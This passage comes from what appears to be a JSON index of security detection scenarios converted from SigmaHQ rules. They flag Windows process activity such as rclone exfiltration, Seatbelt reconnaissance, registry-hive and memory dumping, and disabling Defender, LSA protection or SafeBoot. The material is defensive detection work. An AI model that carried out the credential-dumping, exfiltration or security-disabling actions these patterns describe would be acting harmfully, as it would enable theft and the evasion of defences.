sigmahq/proc_creation_win_pua_rclone_execution\ndescription: |\n  Detects execution of RClone utility for exfiltration as used by various ransomwares strains like REvil, Conti, FiveHands, etc\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains '--config ' && evt.Parsed.CommandLine contains '--no-check-certificate ' && evt.Parsed.CommandLine contains ' copy ' || (evt.Parsed.Image endsWith '\\\\rclone.exe' || evt.Parsed.Description == 'Rsync for cloud storage') && (evt.Parsed.CommandLine contains 'pass' || evt.Parsed.CommandLine contains 'user' || evt.Parsed.CommandLine contains 'copy' || evt.Parsed.CommandLine contains 'sync' || evt.Parsed.CommandLine contains 'config' || evt.Parsed.CommandLine contains 'lsd' || evt.Parsed.CommandLine contains 'remote' || evt.Parsed.CommandLine contains 'ls' || evt.Parsed.CommandLine contains 'mega' || evt.Parsed.CommandLine contains 'pcloud' || evt.Parsed.CommandLine contains 'ftp' || evt.Parsed.CommandLine contains 'ignore-existing' || evt.Parsed.CommandLine contains 'auto-confirm' || evt.Parsed.CommandLine contains 'transfers' || evt.Parsed.CommandLine contains 'multi-thread-streams' || evt.Parsed.CommandLine contains 'no-check-certificate '))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1567.002\n\n  label: \"PUA - Rclone Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects execution of RClone utility for exfiltration as used by various ransomwares strains like REvil, Conti, FiveHands, etc\n", "path": "scenarios/sigmahq/proc_creation_win_pua_rclone_execution.yml", "version": "0.2", "versions": {"0.1": {"digest": "c3be9df1d343bd6971c0bdc07d74462f5a7c03d80475d48ab183394afa497649"}, "0.2": {"digest": "20e432239598f0791f52cbc80a79f64e880b58136eb783b6fa401bbc4da42f7b"}}}, "sigmahq/proc_creation_win_pua_runxcmd": {"content": "type: trigger\nname: sigmahq/proc_creation_win_pua_runxcmd\ndescription: |\n  Detects the use of the RunXCmd tool to execute commands with System or TrustedInstaller accounts\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.CommandLine contains ' /account=system ' || evt.Parsed.CommandLine contains ' /account=ti ') && evt.Parsed.CommandLine contains '/exec=')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1569.002\n\n  label: \"PUA - RunXCmd Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the use of the RunXCmd tool to execute commands with System or TrustedInstaller accounts\n", "path": "scenarios/sigmahq/proc_creation_win_pua_runxcmd.yml", "version": "0.2", "versions": {"0.1": {"digest": "fe6388840d212aee52de1f0ef4447e61ecce916b722b07bed6dfb33525ce5875"}, "0.2": {"digest": "a159749895aab125cd02429fa0d1286d27490e74f70e4985625dee43ea1839c8"}}}, "sigmahq/proc_creation_win_pua_seatbelt": {"content": "type: trigger\nname: sigmahq/proc_creation_win_pua_seatbelt\ndescription: |\n  Detects the execution of the PUA/Recon tool Seatbelt via PE information of command line parameters\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\Seatbelt.exe' || evt.Parsed.OriginalFileName == 'Seatbelt.exe' || evt.Parsed.Description == 'Seatbelt' || evt.Parsed.CommandLine contains ' DpapiMasterKeys' || evt.Parsed.CommandLine contains ' InterestingProcesses' || evt.Parsed.CommandLine contains ' InterestingFiles' || evt.Parsed.CommandLine contains ' CertificateThumbprints' || evt.Parsed.CommandLine contains ' ChromiumBookmarks' || evt.Parsed.CommandLine contains ' ChromiumHistory' || evt.Parsed.CommandLine contains ' ChromiumPresence' || evt.Parsed.CommandLine contains ' CloudCredentials' || evt.Parsed.CommandLine contains ' CredEnum' || evt.Parsed.CommandLine contains ' CredGuard' || evt.Parsed.CommandLine contains ' FirefoxHistory' || evt.Parsed.CommandLine contains ' ProcessCreationEvents' || (evt.Parsed.CommandLine contains ' -group=misc' || evt.Parsed.CommandLine contains ' -group=remote' || evt.Parsed.CommandLine contains ' -group=chromium' || evt.Parsed.CommandLine contains ' -group=slack' || evt.Parsed.CommandLine contains ' -group=system' || evt.Parsed.CommandLine contains ' -group=user' || evt.Parsed.CommandLine contains ' -group=all') && evt.Parsed.CommandLine contains ' -outputfile=')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1526\n   - attack.t1087\n   - attack.t1083\n\n  label: \"PUA - Seatbelt Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the execution of the PUA/Recon tool Seatbelt via PE information of command line parameters\n", "path": "scenarios/sigmahq/proc_creation_win_pua_seatbelt.yml", "version": "0.2", "versions": {"0.1": {"digest": "ac4807ae1ea3a0e738076cb75b0a1697a030ee0c7c5bdf99cfba825dd913ca9f"}, "0.2": {"digest": "d34ec5a7102a0dfbd64ea5db02b6253727d57080daaef1338ab0bc918c544039"}}}, "sigmahq/proc_creation_win_pua_wsudo_susp_execution": {"content": "type: trigger\nname: sigmahq/proc_creation_win_pua_wsudo_susp_execution\ndescription: |\n  Detects usage of wsudo (Windows Sudo Utility). Which is a tool that let the user execute programs with different permissions (System, Trusted Installer, Administrator...etc)\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\wsudo.exe' || evt.Parsed.OriginalFileName == 'wsudo.exe' || evt.Parsed.Description == 'Windows sudo utility' || evt.Parsed.ParentImage endsWith '\\\\wsudo-bridge.exe' || evt.Parsed.CommandLine contains '-u System' || evt.Parsed.CommandLine contains '-uSystem' || evt.Parsed.CommandLine contains '-u TrustedInstaller' || evt.Parsed.CommandLine contains '-uTrustedInstaller' || evt.Parsed.CommandLine contains ' --ti ')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1059\n\n  label: \"PUA - Wsudo Suspicious Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects usage of wsudo (Windows Sudo Utility). Which is a tool that let the user execute programs with different permissions (System, Trusted Installer, Administrator...etc)\n", "path": "scenarios/sigmahq/proc_creation_win_pua_wsudo_susp_execution.yml", "version": "0.2", "versions": {"0.1": {"digest": "cdfb77b1a9d570793753c62acf284e7f1745af133af287423dd54862537becdc"}, "0.2": {"digest": "37793f247e57446e47ebf5fc3af0d8eb56e40da74f9eb6300c0e25cfeca6677e"}}}, "sigmahq/proc_creation_win_python_pty_spawn": {"content": "type: trigger\nname: sigmahq/proc_creation_win_python_pty_spawn\ndescription: |\n  Detects python spawning a pretty tty\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith 'python.exe' || evt.Parsed.Image endsWith 'python3.exe' || evt.Parsed.Image endsWith 'python2.exe') && (evt.Parsed.CommandLine contains 'import pty' && evt.Parsed.CommandLine contains '.spawn(' || evt.Parsed.CommandLine contains 'from pty import spawn'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1059\n\n  label: \"Python Spawning Pretty TTY on Windows\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects python spawning a pretty tty\n", "path": "scenarios/sigmahq/proc_creation_win_python_pty_spawn.yml", "version": "0.2", "versions": {"0.1": {"digest": "3530723330d96713e1c60a2d5a58a14ba44eaac73e6c751438a572022bac8f32"}, "0.2": {"digest": "02ba2f06117adb627959dc0367c62f30f8c47e37ad714676fe48fb332a332c8f"}}}, "sigmahq/proc_creation_win_rar_compression_with_password": {"content": "type: trigger\nname: sigmahq/proc_creation_win_rar_compression_with_password\ndescription: |\n  Detects the use of rar.exe, on the command line, to create an archive with password protection or with a specific compression level. This is pretty indicative of malicious actions.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains ' -hp' && (evt.Parsed.CommandLine contains ' -m' || evt.Parsed.CommandLine contains ' a '))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1560.001\n\n  label: \"Rar Usage with Password and Compression Level\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the use of rar.exe, on the command line, to create an archive with password protection or with a specific compression level. This is pretty indicative of malicious actions.\n", "path": "scenarios/sigmahq/proc_creation_win_rar_compression_with_password.yml", "version": "0.2", "versions": {"0.1": {"digest": "d408ad23a49e727117884853589205078fb8ac992ab19225a397086f6f809245"}, "0.2": {"digest": "4b0294871db70be5606e89fa6d8475ec7aa8571b50e275e764365c833e00fa0b"}}}, "sigmahq/proc_creation_win_rar_susp_greedy_compression": {"content": "type: trigger\nname: sigmahq/proc_creation_win_rar_susp_greedy_compression\ndescription: |\n  Detects RAR usage that creates an archive from a suspicious folder, either a system folder or one of the folders often used by attackers for staging purposes\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\rar.exe' || evt.Parsed.Description == 'Command line RAR' || evt.Parsed.CommandLine contains '.exe a ' || evt.Parsed.CommandLine contains ' a -m') && evt.Parsed.CommandLine contains ' -hp' && evt.Parsed.CommandLine contains ' -r ' && (Match(' :\\\\*.', evt.Parsed.CommandLine) || Match(' :\\\\\\\\*.', evt.Parsed.CommandLine) || Match(' :\\\\$Recycle.bin\\\\', evt.Parsed.CommandLine) || Match(' :\\\\PerfLogs\\\\', evt.Parsed.CommandLine) || Match(' :\\\\Temp', evt.Parsed.CommandLine) || Match(' :\\\\Users\\\\Public\\\\', evt.Parsed.CommandLine) || Match(' :\\\\Windows\\\\', evt.Parsed.CommandLine) || evt.Parsed.CommandLine contains ' %public%'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1059\n\n  label: \"Suspicious Greedy Compression Using Rar.EXE\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects RAR usage that creates an archive from a suspicious folder, either a system folder or one of the folders often used by attackers for staging purposes\n", "path": "scenarios/sigmahq/proc_creation_win_rar_susp_greedy_compression.yml", "version": "0.2", "versions": {"0.1": {"digest": "992e971822adec847a40cbd97eb990424b69e6ee71403dd10c718503d3ca8fec"}, "0.2": {"digest": "aa992c579e9ba1c99157dca51ed0f1c213e7bbc1f40271f7f77a97a8419c88d6"}}}, "sigmahq/proc_creation_win_rdrleakdiag_process_dumping": {"content": "type: trigger\nname: sigmahq/proc_creation_win_rdrleakdiag_process_dumping\ndescription: |\n  Detects the use of the Microsoft Windows Resource Leak Diagnostic tool \"rdrleakdiag.exe\" to dump process memory\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\rdrleakdiag.exe' || evt.Parsed.OriginalFileName == 'RdrLeakDiag.exe') && (evt.Parsed.CommandLine contains '-memdmp' || evt.Parsed.CommandLine contains '/memdmp' || evt.Parsed.CommandLine contains '\u2013memdmp' || evt.Parsed.CommandLine contains '\u2014memdmp' || evt.Parsed.CommandLine contains '\u2015memdmp' || evt.Parsed.CommandLine contains 'fullmemdmp') && (evt.Parsed.CommandLine contains ' -o ' || evt.Parsed.CommandLine contains ' /o ' || evt.Parsed.CommandLine contains ' \u2013o ' || evt.Parsed.CommandLine contains ' \u2014o ' || evt.Parsed.CommandLine contains ' \u2015o ' || evt.Parsed.CommandLine contains ' -p ' || evt.Parsed.CommandLine contains ' /p ' || evt.Parsed.CommandLine contains ' \u2013p ' || evt.Parsed.CommandLine contains ' \u2014p ' || evt.Parsed.CommandLine contains ' \u2015p '))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1003.001\n\n  label: \"Process Memory Dump via RdrLeakDiag.EXE\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the use of the Microsoft Windows Resource Leak Diagnostic tool \"rdrleakdiag.exe\" to dump process memory\n", "path": "scenarios/sigmahq/proc_creation_win_rdrleakdiag_process_dumping.yml", "version": "0.2", "versions": {"0.1": {"digest": "fcb424bac7bfc7e46b96c01cbbe5f7333a68fe896d2a621daa6478c1c3d69271"}, "0.2": {"digest": "f468589a8b3bd5f6fa02efed255999854b6118fb7d1bc08c71f4d70a0fb5ca84"}}}, "sigmahq/proc_creation_win_reg_add_safeboot": {"content": "type: trigger\nname: sigmahq/proc_creation_win_reg_add_safeboot\ndescription: |\n  Detects execution of \"reg.exe\" commands with the \"add\" or \"copy\" flags on safe boot registry keys. Often used by attacker to allow the ransomware to work in safe mode as some security products do not\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\reg.exe' || evt.Parsed.OriginalFileName == 'reg.exe') && evt.Parsed.CommandLine contains '\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\SafeBoot' && (evt.Parsed.CommandLine contains ' copy ' || evt.Parsed.CommandLine contains ' add '))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1562.001\n\n  label: \"Add SafeBoot Keys Via Reg Utility\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects execution of \"reg.exe\" commands with the \"add\" or \"copy\" flags on safe boot registry keys. Often used by attacker to allow the ransomware to work in safe mode as some security products do not\n", "path": "scenarios/sigmahq/proc_creation_win_reg_add_safeboot.yml", "version": "0.2", "versions": {"0.1": {"digest": "89b3dfbce25aba1f40ee868c4a2faaf5fe89abdd0430821378e4a7d0270ad266"}, "0.2": {"digest": "e9685ee836058a5ce7a0a6eee7284215d22b7f5f4901ad4bcc396a21f2e4a80a"}}}, "sigmahq/proc_creation_win_reg_bitlocker": {"content": "type: trigger\nname: sigmahq/proc_creation_win_reg_bitlocker\ndescription: |\n  Detects suspicious addition to BitLocker related registry keys via the reg.exe utility\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains 'REG' && evt.Parsed.CommandLine contains 'ADD' && evt.Parsed.CommandLine contains '\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\FVE' && evt.Parsed.CommandLine contains '/v' && evt.Parsed.CommandLine contains '/f' && (evt.Parsed.CommandLine contains 'EnableBDEWithNoTPM' || evt.Parsed.CommandLine contains 'UseAdvancedStartup' || evt.Parsed.CommandLine contains 'UseTPM' || evt.Parsed.CommandLine contains 'UseTPMKey' || evt.Parsed.CommandLine contains 'UseTPMKeyPIN' || evt.Parsed.CommandLine contains 'RecoveryKeyMessageSource' || evt.Parsed.CommandLine contains 'UseTPMPIN' || evt.Parsed.CommandLine contains 'RecoveryKeyMessage'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1486\n\n  label: \"Suspicious Reg Add BitLocker\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects suspicious addition to BitLocker related registry keys via the reg.exe utility\n", "path": "scenarios/sigmahq/proc_creation_win_reg_bitlocker.yml", "version": "0.2", "versions": {"0.1": {"digest": "78138d75721963291fafd48af0bcf6361a285b7f6d4ed8ec4e2331d759b5d603"}, "0.2": {"digest": "6e9bce2056717b1086ed07ab8be29d6387302dd68c3696fc7ddd20e1f1f98062"}}}, "sigmahq/proc_creation_win_reg_delete_safeboot": {"content": "type: trigger\nname: sigmahq/proc_creation_win_reg_delete_safeboot\ndescription: |\n  Detects execution of \"reg.exe\" commands with the \"delete\" flag on safe boot registry keys. Often used by attacker to prevent safeboot execution of security products\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith 'reg.exe' || evt.Parsed.OriginalFileName == 'reg.exe') && evt.Parsed.CommandLine contains ' delete ' && evt.Parsed.CommandLine contains '\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\SafeBoot')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1562.001\n\n  label: \"SafeBoot Registry Key Deleted Via Reg.EXE\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects execution of \"reg.exe\" commands with the \"delete\" flag on safe boot registry keys. Often used by attacker to prevent safeboot execution of security products\n", "path": "scenarios/sigmahq/proc_creation_win_reg_delete_safeboot.yml", "version": "0.2", "versions": {"0.1": {"digest": "ffbb282a7cd6be77026c7a331b6918072bed1096835c44343d1c8879ed9359d8"}, "0.2": {"digest": "5c74b4fd22b186cb0bfbe10e2160f696313cf38c27c2afc34e7bfb4cfae275a3"}}}, "sigmahq/proc_creation_win_reg_delete_services": {"content": "type: trigger\nname: sigmahq/proc_creation_win_reg_delete_services\ndescription: |\n  Detects execution of \"reg.exe\" commands with the \"delete\" flag on services registry key. Often used by attacker to remove AV software services\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith 'reg.exe' || evt.Parsed.OriginalFileName == 'reg.exe') && evt.Parsed.CommandLine contains ' delete ' && evt.Parsed.CommandLine contains '\\\\SYSTEM\\\\CurrentControlSet\\\\services\\\\')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1562.001\n\n  label: \"Service Registry Key Deleted Via Reg.EXE\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects execution of \"reg.exe\" commands with the \"delete\" flag on services registry key. Often used by attacker to remove AV software services\n", "path": "scenarios/sigmahq/proc_creation_win_reg_delete_services.yml", "version": "0.2", "versions": {"0.1": {"digest": "cc1a04b1086b919bf077b9dd056b10386d0d45fc4df61b8ff57f68a8ff4f2ec5"}, "0.2": {"digest": "83a8655941bdfb5c7e9df95f5216239fe98c63b075e066382d7f64dc26b42924"}}}, "sigmahq/proc_creation_win_reg_disable_sec_services": {"content": "type: trigger\nname: sigmahq/proc_creation_win_reg_disable_sec_services\ndescription: |\n  Detects execution of \"reg.exe\" to disable security services such as Windows Defender.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains 'reg' && evt.Parsed.CommandLine contains 'add' && evt.Parsed.CommandLine contains 'd 4' && evt.Parsed.CommandLine contains 'v Start' && (evt.Parsed.CommandLine contains '\\\\AppIDSvc' || evt.Parsed.CommandLine contains '\\\\MsMpSvc' || evt.Parsed.CommandLine contains '\\\\NisSrv' || evt.Parsed.CommandLine contains '\\\\SecurityHealthService' || evt.Parsed.CommandLine contains '\\\\Sense' || evt.Parsed.CommandLine contains '\\\\UsoSvc' || evt.Parsed.CommandLine contains '\\\\WdBoot' || evt.Parsed.CommandLine contains '\\\\WdFilter' || evt.Parsed.CommandLine contains '\\\\WdNisDrv' || evt.Parsed.CommandLine contains '\\\\WdNisSvc' || evt.Parsed.CommandLine contains '\\\\WinDefend' || evt.Parsed.CommandLine contains '\\\\wscsvc' || evt.Parsed.CommandLine contains '\\\\wuauserv'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1562.001\n\n  label: \"Security Service Disabled Via Reg.EXE\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects execution of \"reg.exe\" to disable security services such as Windows Defender.\n", "path": "scenarios/sigmahq/proc_creation_win_reg_disable_sec_services.yml", "version": "0.2", "versions": {"0.1": {"digest": "72be50ff26303869483a8bf88f290861ed818f194dfe755690b829ff2d6bc980"}, "0.2": {"digest": "89b66e182433a30462deb3835a15801f5ffa56951d701f2a444f173fa1411ae4"}}}, "sigmahq/proc_creation_win_reg_dumping_sensitive_hives": {"content": "type: trigger\nname: sigmahq/proc_creation_win_reg_dumping_sensitive_hives\ndescription: |\n  Detects the usage of \"reg.exe\" in order to dump sensitive registry hives. This includes SAM, SYSTEM and SECURITY hives.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\reg.exe' || evt.Parsed.OriginalFileName == 'reg.exe') && (evt.Parsed.CommandLine contains ' save ' || evt.Parsed.CommandLine contains ' export ' || evt.Parsed.CommandLine contains ' \u02e2ave ' || evt.Parsed.CommandLine contains ' e\u02e3port ') && (evt.Parsed.CommandLine contains 'hklm' || evt.Parsed.CommandLine contains 'hk\u02eam' || evt.Parsed.CommandLine contains 'hkey_local_machine' || evt.Parsed.CommandLine contains 'hkey_\u02eaocal_machine' || evt.Parsed.CommandLine contains 'hkey_loca\u02ea_machine' || evt.Parsed.CommandLine contains 'hkey_\u02eaoca\u02ea_machine') && (evt.Parsed.CommandLine contains '\\\\system' || evt.Parsed.CommandLine contains '\\\\sam' || evt.Parsed.CommandLine contains '\\\\security' || evt.Parsed.CommandLine contains '\\\\\u02e2ystem' || evt.Parsed.CommandLine contains '\\\\sy\u02e2tem' || evt.Parsed.CommandLine contains '\\\\\u02e2y\u02e2tem' || evt.Parsed.CommandLine contains '\\\\\u02e2am' || evt.Parsed.CommandLine contains '\\\\\u02e2ecurity'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1003.002\n   - attack.t1003.004\n   - attack.t1003.005\n\n  label: \"Dumping of Sensitive Hives Via Reg.EXE\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the usage of \"reg.exe\" in order to dump sensitive registry hives. This includes SAM, SYSTEM and SECURITY hives.\n", "path": "scenarios/sigmahq/proc_creation_win_reg_dumping_sensitive_hives.yml", "version": "0.2", "versions": {"0.1": {"digest": "6dad295590206bd07b03c07f3ef920a8bf74db37db2dc4c86de0aec851876f9f"}, "0.2": {"digest": "8e2ddce76b88186d9fa0dbb32f93b9ad6ea8c9eb1e465c820c3781024ed6cb48"}}}, "sigmahq/proc_creation_win_reg_lsa_disable_restricted_admin": {"content": "type: trigger\nname: sigmahq/proc_creation_win_reg_lsa_disable_restricted_admin\ndescription: |\n  Detects changes to the \"DisableRestrictedAdmin\" registry value in order to disable or enable RestrictedAdmin mode. RestrictedAdmin mode prevents the transmission of reusable credentials to the remote system to which you connect using Remote Desktop. This prevents your credentials from being harvested during the initial connection process if the remote server has been compromise \nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains '\\\\System\\\\CurrentControlSet\\\\Control\\\\Lsa\\\\' && evt.Parsed.CommandLine contains 'DisableRestrictedAdmin')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1112\n\n  label: \"RestrictedAdminMode Registry Value Tampering - ProcCreation\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects changes to the \"DisableRestrictedAdmin\" registry value in order to disable or enable RestrictedAdmin mode. RestrictedAdmin mode prevents the transmission of reusable credentials to the remote system to which you connect using Remote Desktop. This prevents your credentials from being harvested during the initial connection process if the remote server has been compromise \n", "path": "scenarios/sigmahq/proc_creation_win_reg_lsa_disable_restricted_admin.yml", "version": "0.2", "versions": {"0.1": {"digest": "9e1a6813bcd07a8d0a2c6f47379d17741d59ffda296b7d09027f224d9e546af8"}, "0.2": {"digest": "58d5dcb4af37af934942cd1f2771e72058612b8dce768366635988dd92181ecb"}}}, "sigmahq/proc_creation_win_reg_lsa_ppl_protection_disabled": {"content": "type: trigger\nname: sigmahq/proc_creation_win_reg_lsa_ppl_protection_disabled\ndescription: |\n  Detects the usage of the \"reg.exe\" utility to disable PPL protection on the LSA process\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\reg.exe' || evt.Parsed.OriginalFileName == 'reg.exe') && evt.Parsed.CommandLine contains 'SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa' && evt.Parsed.CommandLine contains ' add ' && evt.Parsed.CommandLine contains ' /d 0' && evt.Parsed.CommandLine contains ' /v RunAsPPL ')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1562.010\n\n  label: \"LSA PPL Protection Disabled Via Reg.EXE\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the usage of the \"reg.exe\" utility to disable PPL protection on the LSA process\n", "path": "scenarios/sigmahq/proc_creation_win_reg_lsa_ppl_protection_disabled.yml", "version": "0.2", "versions": {"0.1": {"digest": "aa13a7a4fbada3f976494c52149edb871b2d96fcb8f602c4a3b128f617963631"}, "0.2": {"digest": "43c4b1621f38ac42b2d4f22a336d63d2e38b2d3aabe04b1986405f86e001a054"}}}, "sigmahq/proc_creation_win_reg_nolmhash": {"content": "type: trigger\nname: sigmahq/proc_creation_win_reg_nolmhash\ndescription: |\n  Detects changes to the \"NoLMHash\" registry value in order to allow Windows to store LM Hashes. By setting this registry value to \"0\" (DWORD), Windows will be allowed to store a LAN manager hash of your password in Active Directory and local SAM databases. \nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains '\\\\System\\\\CurrentControlSet\\\\Control\\\\Lsa' && evt.Parsed.CommandLine contains 'NoLMHash' && evt.Parsed.CommandLine contains ' 0')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1112\n\n  label: \"Enable LM Hash Storage - ProcCreation\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects changes to the \"NoLMHash\" registry value in order to allow Windows to store LM Hashes. By setting this registry value to \"0\" (DWORD), Windows will be allowed to store a LAN manager hash of your password in Active Directory and local SAM databases. \n", "path": "scenarios/sigmahq/proc_creation_win_reg_nolmhash.yml", "version": "0.2", "versions": {"0.1": {"digest": "f758f2822c2b4ea2b0801e86746121d216c31b7538b5d118aeab04183f1eeb21"}, "0.2": {"digest": "eeefa843d1b8c8ac517d19d88ded5b4f656a88e90eebcf9363a7b13e08895d47"}}}, "sigmahq/proc_creation_win_reg_rdp_keys_tamper": {"content": "type: trigger\nname: sigmahq/proc_creation_win_reg_rdp_keys_tamper\ndescription: |\n  Detects the execution of \"reg.exe\" for enabling/disabling the RDP service on the host by tampering with the 'CurrentControlSet\\Control\\Terminal Server' values\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\reg.exe' || evt.Parsed.OriginalFileName == 'reg.exe') && evt.Parsed.CommandLine contains ' add ' && evt.Parsed.CommandLine contains '\\\\CurrentControlSet\\\\Control\\\\Terminal Server' && evt.Parsed.CommandLine contains 'REG_DWORD' && evt.Parsed.CommandLine contains ' /f' && (evt.Parsed.CommandLine contains 'Licensing Core' && evt.Parsed.CommandLine contains 'EnableConcurrentSessions' || evt.Parsed.CommandLine contains 'WinStations\\\\RDP-Tcp' || evt.Parsed.CommandLine contains 'MaxInstanceCount' || evt.Parsed.CommandLine contains 'fEnableWinStation' || evt.Parsed.CommandLine contains 'TSUserEnabled' || evt.Parsed.CommandLine contains 'TSEnabled' || evt.Parsed.CommandLine contains 'TSAppCompat' || evt.Parsed.CommandLine contains 'IdleWinStationPoolCount' || evt.Parsed.CommandLine contains 'TSAdvertise' || evt.Parsed.CommandLine contains 'AllowTSConnections' || evt.Parsed.CommandLine contains 'fSingleSessionPerUser' || evt.Parsed.CommandLine contains 'fDenyTSConnections'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1021.001\n   - attack.t1112\n\n  label: \"Potential Tampering With RDP Related Registry Keys Via Reg.EXE\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the execution of \"reg.exe\" for enabling/disabling the RDP service on the host by tampering with the 'CurrentControlSet\\Control\\Terminal Server' values\n", "path": 